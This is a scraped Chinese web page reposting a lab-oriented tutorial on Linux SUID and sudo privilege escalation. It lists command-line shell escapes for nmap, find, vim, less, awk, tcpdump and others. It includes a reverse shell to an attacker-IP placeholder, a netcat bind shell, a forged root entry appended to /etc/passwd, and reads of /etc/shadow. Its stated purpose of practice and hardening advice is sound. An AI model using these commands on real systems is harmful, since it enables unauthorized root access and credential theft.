@@ -1,0 +1,291 @@
+<!doctype html>
+<html xml:lang="zh-CN" lang="zh-CN">
+
+<head>
+        <link rel="canonical" href="https://freev2rayu.github.io/news/article-84640.htm" />
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <title>Linux-SUID提权_在线工具Live2D</title>
+        <meta name="description" content="最近打靶场的时候最后都会涉及到提权，所以想着总结一下。  SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者" />
+        <link rel="icon" href="/assets/website/img/freev2rayu/favicon.ico" type="image/x-icon"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <meta name="author" content="Free V2rayU节点机场订阅官网">
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="https://freev2rayu.github.io/news/article-84640.htm" />
+    <meta property="og:site_name" content="Free V2rayU节点机场订阅官网" />
+    <meta property="og:title" content="Linux-SUID提权_在线工具Live2D" />
+    <meta property="og:image" content="https://freev2rayu.github.io/uploads/20250202/f5df030bd15652482b6b88711bc18f99.webp" />
+        <meta property="og:release_date" content="2025-03-30T09:34:06" />
+    <meta property="og:updated_time" content="2025-03-30T09:34:06" />
+        <meta property="og:description" content="最近打靶场的时候最后都会涉及到提权，所以想着总结一下。  SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者" />
+    
+    <meta name="applicable-device" content="pc,mobile" />
+    <meta name="renderer" content="webkit" />
+    <meta name="force-rendering" content="webkit" />
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta name="robots" content="max-image-preview:large" />
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-title" content="Linux-SUID提权_在线工具Live2D">
+    <meta name="format-detection" content="telephone=no">
+
+    <link rel="dns-prefetch" href="https:/www.googletagmanager.com">
+    <link rel="dns-prefetch" href="https://www.googleadservices.com">
+    <link rel="dns-prefetch" href="https://www.google-analytics.com">
+    <link rel="dns-prefetch" href="https://pagead2.googlesyndication.com">
+    <link rel="dns-prefetch" href="https://cm.g.doubleclick.net">
+    <link rel="dns-prefetch" href="https://fonts.googleapis.com">
+
+    <!-- CSS here -->
+    <link rel="stylesheet" href="/assets/website/css/freev2rayu/bootstrap.min.css">
+    <link rel="stylesheet" href="/assets/website/css/freev2rayu/meanmenu.min.css">
+    <link rel="stylesheet" href="/assets/website/css/freev2rayu/animate.css">
+    <link rel="stylesheet" href="/assets/website/css/freev2rayu/swiper-bundle.min.css">
+    <link rel="stylesheet" href="/assets/website/css/freev2rayu/slick.css">
+    <link rel="stylesheet" href="/assets/website/css/freev2rayu/backtotop.css">
+    <link rel="stylesheet" href="/assets/website/css/freev2rayu/magnific-popup.css">
+    <link rel="stylesheet" href="/assets/website/css/freev2rayu/fontawesome-pro.css">
+    <link rel="stylesheet" href="/assets/website/css/freev2rayu/spacing.css">
+    <link rel="stylesheet" href="/assets/website/css/freev2rayu/main.css">
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-9P3XHBJQ2R"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-9P3XHBJQ2R');
+</script>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3332997411212854"
+     crossorigin="anonymous"></script>
+</head>
+
+<body data-page="detail">
+        <!-- Offcanvas area start -->
+    <div class="fix">
+        <div class="offcanvas__info">
+            <div class="offcanvas__wrapper">
+                <div class="offcanvas__content">
+                    <div class="offcanvas__top mb-40 d-flex justify-content-between align-items-center">
+                        <div class="offcanvas__logo">
+                            <a href="/">
+                                Free V2rayU                            </a>
+                        </div>
+                        <div class="offcanvas__close">
+                            <button>
+                                <i class="fal fa-times"></i>
+                            </button>
+                        </div>
+                    </div>
+                    <div class="mobile-menu fix mb-40"></div>
+                    <div class="offcanvas__social">
+                        <ul>
+                            <li><a href="#"><i class="fab fa-facebook-f"></i></a></li>
+                            <li><a href="#"><i class="fab fa-twitter"></i></a></li>
+                            <li><a href="#"><i class="fab fa-youtube"></i></a></li>
+                            <li><a href="#"><i class="fab fa-linkedin"></i></a></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="offcanvas__overlay"></div>
+    <div class="offcanvas__overlay-white"></div>
+    <!-- Offcanvas area start -->
+    <!-- Header area start -->
+    <header>
+        <div id="header-sticky" class="header__area-3 header__transparent">
+            <div class="container">
+                <div class="row align-items-center">
+                    <div class="col-xl-2 col-lg-2 col-6">
+                        <div class="header__logo">
+                            <a href="/" class="p-0 xcblog-blog-logo">
+                                                                <span class="text-primary m-0">Free V2rayU</span>
+                                                            </a>
+                        </div>
+                    </div>
+                    <div class="col-xl-8 col-lg-8 d-none d-lg-block">
+                        <div class="menu__main-wrapper-3 d-flex justify-content-end">
+                            <div class="main-menu main-menu-3 d-none d-none d-lg-block">
+                                <nav id="mobile-menu">
+                                    <ul>
+                                                                                <li>
+                                            <a href="/">首页</a>
+                                        </li>
+                                                                                <li>
+                                            <a href="/free-nodes/">免费节点</a>
+                                        </li>
+                                                                                <li>
+                                            <a href="/paid-subscribe/">推荐机场</a>
+                                        </li>
+                                                                                <li>
+                                            <a href="/client.htm">客户端</a>
+                                        </li>
+                                                                                <li>
+                                            <a href="/news/">新闻资讯</a>
+                                        </li>
+                                                                            </ul>
+                                </nav>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-xl-2 col-lg-2 col-6">
+                        <div class="header__right d-flex align-items-center justify-content-end">
+                            <div class="header__toggle d-xl-none">
+                                <a class="sidebar__active" href="javascript:void(0)">
+                                    <div class="bar-icon">
+                                        <span></span>
+                                        <span></span>
+                                        <span></span>
+                                    </div>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+    <!-- Header area end -->
+    <!-- Body main wrapper start -->
+    <main>
+        <!-- Breadcrumb area stat -->
+        <div class="breadcrumb__area">
+            <img class="breadcrumb__shape-1" src="/assets/website/img/freev2rayu/breadcrum-1.png.png" alt="image not found">
+            <img class="breadcrumb__shape-2" src="/assets/website/img/freev2rayu/breadcrum-1.png.png" alt="image not found">
+            <div class="container">
+                <div class="row">
+                    <div class="col-xl-12">
+                        <div class="breadcrumb__wrapper text-center">
+                            <div class="breadcrumb__title">
+                                <h1>Linux-SUID提权_在线工具Live2D</h1>
+                            </div>
+                            <div class="breadcrumb__menu">
+                                <nav aria-label="Breadcrumbs" class="breadcrumb-trail breadcrumbs">
+                                    <ul class="trail-items">
+                                        <li class="trail-item trail-begin"><span><a href="/">首页</a></span></li>
+                                        <li class="trail-item trail-begin"><span><a href="/news/">新闻资讯</a></span></li>
+                                        <li class="trail-item trail-end"><span>正文</span></li>
+                                    </ul>
+                                </nav>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- Breadcrumb area end -->
+        <!-- About area start -->
+        <div class="about__area p-relative pt-120 pb-60">
+            <div class="container">
+                <div class="row">
+                    <div class="col-md-9">
+                                        <input type="hidden" id="share-website-info" data-name="V2ray X节点订阅官网" data-url="https://v2rayx.github.io">
+                  				  				  				</h1> <p>最近打靶场的时候最后都会涉及到提权，所以想着总结一下。</p> </h1> <p>SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。<br /> 那么，为什么要给Linux二进制文件设置这种权限呢？其实原因有很多，例如，程序ping需要root权限才能打开网络套接字，但执行该程序的用户通常都是由普通用户，来验证与其他主机的连通性。<br /> 但是，如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。</p> <p>比如<code>password</code>的权限：</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/08b5e8a7d180250b1fd8c089e641b65c.jpg" alt="Linux-SUID提权_在线工具Live2D"><br /> 用户可以输入自己的密码或者不需要密码在root权限下执行命令，这可在设置文件 /etc/sudoers 中配置</p> <h2 id="11-etcsudoers-语法">1.1 /etc/sudoers 语法</h2> <pre><code>root ALL=(ALL) ALL</code></pre> <p>root 用户可以从 ALL（任何）终端执行，充当ALL（任何）用户，并运行ALL（任何）命令。第一部分指定用户，第二部分指定可充当用户，第三部分指定 sudo 可运行的命令。</p> <pre><code>touhid ALL= /sbin/poweroff</code></pre> <p>输入 touchid 的密码，可以 sudo 执行 poweroff 命令。</p> <pre><code>touhid ALL = (root) NOPASSWD: /usr/bin/find</code></pre> <p>不输入密码,可以 sudo 执行 find 命令</p> <h2 id="12-查找具有-suid-权限位文件">1.2 查找具有 SUID 权限位文件</h2> <p>以下命令可以找到正在系统上运行的所有SUID可执行文件。准确的说，这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。</p> <pre><code># suid权限值就是4000，下面两个语句一个意思 find / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null</code></pre> <p>也可以使用<code>sudo -l</code> 命令列出当前用户可执行的命令:</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/22b8f6accfcc934f93a3cc164a5f4632.jpg" alt="Linux-SUID提权_在线工具Live2D"></p> </h1> <h2 id="21-nmap">2.1 nmap</h2> <p>nmap（2.02-5.21）存在交换模式，可利用提权</p> <pre><code>nmap --interactive</code></pre> <p>之后执行：</p> <pre><code>nmap&gt; !sh sh-3.2# whoami root</code></pre> <p>msf中的模块为：</p> <pre><code>exploit/unix/local/setuid_nmap</code></pre> <p>较新版可使用 --script 参数：</p> <pre><code>echo "os.execute('/bin/sh')" &gt; /tmp/shell.nse &amp;&amp; sudo nmap --script=/tmp/shell.nse</code></pre> <h2 id="22-find">2.2 find</h2> <p>find比较常用,find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。</p> <pre><code>touch test find test -exec whoami \;</code></pre> <pre><code>进入shell find test -exec '/bin/sh' \; sh-5.0# whoami root</code></pre> <p>linux一般都安装了nc 我们也可以利用nc 广播或反弹shell</p> <p>广播shell:</p> <pre><code>find test -exec netcat -lvp 5555 -e /bin/sh \;</code></pre> <p>kali(攻击机)上:</p> <pre><code>nc 靶机ip 4444</code></pre> <p>反弹shell:</p> <pre><code>find test -exec bash -c 'bash -i &gt;&amp; /dev/tcp/攻击机IP/4444 0&gt;&amp;1' \;</code></pre> <p>kali(攻击机)上：</p> <pre><code>nc -lvnp 4444</code></pre> <h2 id="23-vivim">2.3 vi/vim</h2> <p>打开vim,按下ESC</p> <pre><code>:set shell=/bin/sh :shell</code></pre> <p>或者</p> <pre><code>sudo vim -c '!sh'</code></pre> <h2 id="24-bash">2.4 bash</h2> <pre><code>bash -p bash-3.2# id uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)</code></pre> <h2 id="25-less">2.5 less</h2> <p><strong>注意事项：我记得less跟more提权的时候那个命令行要拉低一点，不能在一页显示完文件才行(要注意的是使用more和less一定读取一个比较大的文件,如果文件太小无法进入翻页功能也就无法使用!命令进入shell)</strong></p> <pre><code>less /etc/passwd !/bin/sh</code></pre> <h2 id="26-more">2.6 more</h2> <pre><code>more /home/pelle/myfile !/bin/bash</code></pre> <h2 id="27-cp">2.7 cp</h2> <p>覆盖<code>/etc/shadow</code> 或<code>/etc/passwd</code></p> <pre><code>[zabbix@localhost ~]$ cat /etc/passwd &gt;passwd 2.[zabbix@localhost ~]$ openssl passwd -1 -salt hack hack123 3.$1$hack$WTn0dk2QjNeKfl.DHOUue0 4.[zabbix@localhost ~]$ echo 'hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash' &gt;&gt; passwd 5.[zabbix@localhost ~]$ cp passwd /etc/passwd 6.[zabbix@localhost ~]$ su - hack 7.Password: 8.[root@361way ~]# id 9.uid=0(hack) gid=0(root) groups=0(root) 10.[root@361way ~]# cat /etc/passwd|tail -1 11.hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash</code></pre> <h2 id="28-mv">2.8 mv</h2> <p>覆盖<code>/etc/shadow</code> 或<code>/etc/passwd</code></p> <h2 id="29-nano">2.9 nano</h2> <p>nano也算是比较上古的文本编辑器了</p> <p>nano进入shell的方法为</p> <pre><code>nano #进入nano编辑器 Ctrl + R Ctrl + X  #即可输入命令</code></pre> <h2 id="210-awk">2.10 awk</h2> <pre><code>awk 'BEGIN {system("/bin/sh")}'</code></pre> <h2 id="211-man">2.11 man</h2> <pre><code>man passwd !/bin/bash</code></pre> <h2 id="212-wget">2.12 wget</h2> <pre><code>wget http://192.168.56.1:8080/passwd -O /etc/passwd</code></pre> <h2 id="213-apache">2.13 apache</h2> <p>仅可查看文件，不能弹 shell：</p> <pre><code>apache2 -f /etc/shadow</code></pre> <h2 id="214-tcpdump">2.14 tcpdump</h2> <pre><code>echo $'id\ncat /etc/shadow' &gt; /tmp/.test chmod +x /tmp/.test sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root</code></pre> <h2 id="215-pythonperlrubyluaphpetc">2.15 python/perl/ruby/lua/php/etc</h2> <p>python:</p> <pre><code>python -c "import os;os.system('/bin/bash')"</code></pre> <p>perl:</p> <pre><code>exec "/bin/bash";</code></pre> <p>其他的语言反弹shell参考以下链接：<br /><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://weibell.github.io/reverse-shell-generator/"  target="_blank" rel="nofollow">https://weibell.github.io/reverse-shell-generator/</a></p> <p>参考链接：</p> <ul> <li><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://touhidshaikh.com/blog/?p=790"  title="Abusing SUDO (Linux Privilege Escalation)" target="_blank" rel="nofollow">Abusing SUDO (Linux Privilege Escalation)</a></li> <li><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://www.anquanke.com/post/id/86979"  title="【安全科普】Linux提权——利用可执行文件SUID" target="_blank" rel="nofollow">【安全科普】Linux提权——利用可执行文件SUID</a></li> <li><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://www.jianshu.com/p/e6c4c4bdf7c3"  title="linux特殊权限SUID、SGID、SBIT" target="_blank" rel="nofollow">linux特殊权限SUID、SGID、SBIT</a></li> <li><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=http://101.200.63.12/index.php/archives/521/"  title="SUID 提权 - CoColi丶" target="_blank" rel="nofollow">SUID 提权 - CoColi丶</a></li> <li><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://evi1cg.me/archives/SUID_Privilege_Escalation.html"  title="SUID Privilege Escalation - Evi1cg" target="_blank" rel="nofollow">SUID Privilege Escalation - Evi1cg</a></li> </ul> </h1> <p>SUID提权由来已久,属于一种古早的提权技术,但其生命力经久不衰。</p> <p>这要求管理员要仔细研究具有SUID权限的文件,不要给易被利用的文件以SUID权限,防止SUID的滥用导致黑客在进入服务器时轻易获取root权限。</p> 			                <div class="clearfix"></div>
+                <div class="col-md-12 mt-5">
+                                        <p>上一个：<a href="/news/article-83917.htm">养猫领养协议的目的和意义（领养猫协议有高额违约金）</a></p>
+                                        <p>下一个：<a href="/news/article-84641.htm">宠物美容师要培训多久才能学会（宠物美容师培训教程）</a></p>
+                                    </div>
+                                    </div>
+                    <div class="col-md-3">
+                        <div class="panel panel-default">
+    <div class="panel-heading">
+        <h3 class="panel-title">热门文章</h3>
+    </div>
+    <div class="panel-body">
+        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
+                        <li class="py-2"><a href="/news/article-68346.htm" title="encodeURI()和encodeURIComponent()的区别">encodeURI()和encodeURIComponent()的区别</a></li>
+                        <li class="py-2"><a href="/news/article-69003.htm" title="长沙宠物领养吧 长沙宠物领养吧百度贴吧">长沙宠物领养吧 长沙宠物领养吧百度贴吧</a></li>
+                        <li class="py-2"><a href="/free-nodes/2025-3-15-free-v2ray-subscribe.htm" title="3月15日最新V2rayU订阅 | 22.3M/S|2025年V2ray/Clash/Shadowrocket/SSR免费节点链接地址">3月15日最新V2rayU订阅 | 22.3M/S|2025年V2ray/Clash/Shadowrocket/SSR免费节点链接地址</a></li>
+                        <li class="py-2"><a href="/free-nodes/2025-3-2-free-subscribe-node.htm" title="3月2日最新V2rayU订阅 | 20.6M/S|2025年Clash/Shadowrocket/V2ray/SSR免费节点链接地址">3月2日最新V2rayU订阅 | 20.6M/S|2025年Clash/Shadowrocket/V2ray/SSR免费节点链接地址</a></li>
+                        <li class="py-2"><a href="/news/article-86073.htm" title="宠物店进货渠道怎么找货源卖货（宠物店进货渠道怎么找货源卖货呢）">宠物店进货渠道怎么找货源卖货（宠物店进货渠道怎么找货源卖货呢）</a></li>
+                        <li class="py-2"><a href="/news/article-75644.htm" title="动物医院的电话是什么 动物医院的电话是什么?">动物医院的电话是什么 动物医院的电话是什么?</a></li>
+                        <li class="py-2"><a href="/news/article-77664.htm" title="动物救援中心 上海动物救援中心">动物救援中心 上海动物救援中心</a></li>
+                        <li class="py-2"><a href="/free-nodes/2025-3-19-clash-v2ray-ss-ssr.htm" title="3月19日最新V2rayU订阅 | 19.2M/S|2025年SSR/Shadowrocket/Clash/V2ray免费节点链接地址">3月19日最新V2rayU订阅 | 19.2M/S|2025年SSR/Shadowrocket/Clash/V2ray免费节点链接地址</a></li>
+                        <li class="py-2"><a href="/free-nodes/2025-3-11-node-share-links.htm" title="3月11日最新V2rayU订阅 | 19.9M/S|2025年SSR/Clash/Shadowrocket/V2ray免费节点链接地址">3月11日最新V2rayU订阅 | 19.9M/S|2025年SSR/Clash/Shadowrocket/V2ray免费节点链接地址</a></li>
+                        <li class="py-2"><a href="/free-nodes/2025-3-17-node-share.htm" title="3月17日最新V2rayU订阅 | 22.6M/S|2025年V2ray/Shadowrocket/Clash/SSR免费节点链接地址">3月17日最新V2rayU订阅 | 22.6M/S|2025年V2ray/Shadowrocket/Clash/SSR免费节点链接地址</a></li>
+                    </ul>
+    </div>
+</div>
+
+<div class="panel panel-default">
+    <div class="panel-heading">
+        <h3 class="panel-title">归纳</h3>
+    </div>
+    <div class="panel-body">
+        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">3</span> <a href="/date/2025-04/" title="2025-04 归档">2025-04</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">90</span> <a href="/date/2025-03/" title="2025-03 归档">2025-03</a></h4>
+            </li>
+                    </ul>
+    </div>
+</div>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- About area end -->
+                <!-- Footer area start -->
+        <footer>
+            <section class="footer__border p-relative z-index-11 pt-120 pb-55" data-background="assets/img/shape/footer-bg.png">
+                <div class="footer__style-3">
+                    <span class="footer__cercle"></span>
+                    <div class="container">
+                        <div class="row">
+                            <div class="col-12">
+                                <div class="footer__copyright">
+                                    <div class="copyright__text text-center">
+                                        <p>
+                                            <a href="/">首页</a> |
+                                            <a href="/free-node/">免费节点</a> |
+                                            <a href="/news/">新闻资讯</a> |
+                                            <a href="/about-us.htm">关于我们</a> |
+                                            <a href="/disclaimer.htm">免责申明</a> |
+                                            <a href="/privacy.htm">隐私申明</a> |
+                                            <a href="/sitemap.xml">网站地图</a>
+                                        </p>
+                                        <a href="/">Free V2rayU节点机场订阅官网</a> 版权所有 Powered by WordPress
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </footer>
+        <!-- Footer area end -->
+        <!-- Back to top start -->
+        <div class="progress-wrap">
+            <svg class="progress-circle svg-content" width="100%" height="100%" viewbox="-1 -1 102 102">
+                <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"></path>
+            </svg>
+        </div>
+        <!-- Back to top end -->
+        <!-- JS here -->
+        <script src="/assets/website/js/frontend/freev2rayu/jquery-3.6.0.min.js"></script>
+        <script src="/assets/website/js/frontend/freev2rayu/waypoints.min.js"></script>
+        <script src="/assets/website/js/frontend/freev2rayu/bootstrap.min.js"></script>
+        <script src="/assets/website/js/frontend/freev2rayu/meanmenu.min.js"></script>
+        <script src="/assets/website/js/frontend/freev2rayu/swiper-bundle.min.js"></script>
+        <script src="/assets/website/js/frontend/freev2rayu/slick.min.js"></script>
+        <script src="/assets/website/js/frontend/freev2rayu/magnific-popup.min.js"></script>
+        <script src="/assets/website/js/frontend/freev2rayu/backtotop.js"></script>
+        <script src="/assets/website/js/frontend/freev2rayu/counterup.js"></script>
+        <script src="/assets/website/js/frontend/freev2rayu/wow.min.js"></script>
+        <script src="/assets/website/js/frontend/freev2rayu/imagesloaded.pkgd.min.js"></script>
+        <script src="/assets/website/js/frontend/freev2rayu/isotope.pkgd.min.js"></script>
+        <script src="/assets/website/js/frontend/freev2rayu/ajax-form.js"></script>
+        <script src="/assets/website/js/frontend/freev2rayu/main.js"></script>
+        <script src="https://www.freeclashnode.com/assets/js/frontend/invite-url.js"></script>
+        <script src="/assets/website/js/frontend/G.js"></script>
+    </main>
+    <!-- Body main wrapper end -->
+</body>
+
+</html>
